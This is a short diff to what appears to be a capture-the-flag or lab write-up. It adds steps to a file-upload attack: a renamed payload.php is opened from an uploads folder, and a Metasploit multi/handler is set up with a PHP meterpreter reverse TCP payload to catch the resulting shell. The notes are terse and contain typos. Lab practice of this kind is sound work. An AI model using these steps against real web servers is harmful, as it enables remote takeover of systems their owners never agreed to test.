@@ -53,4 +53,13 @@ Burp will intercept and now change the `payload.php.jpg` into `payload.php`.
   
 
   
+  ## sd
+  Open the ph file from the <ip>uploads. 
   
+  Have the msfconsole pre-ready for connection. 
+  
+  ``use ecploit/multi/handler
+  set payload php/meterpreter/reverse_tcp
+  set ...
+  run
+  ``
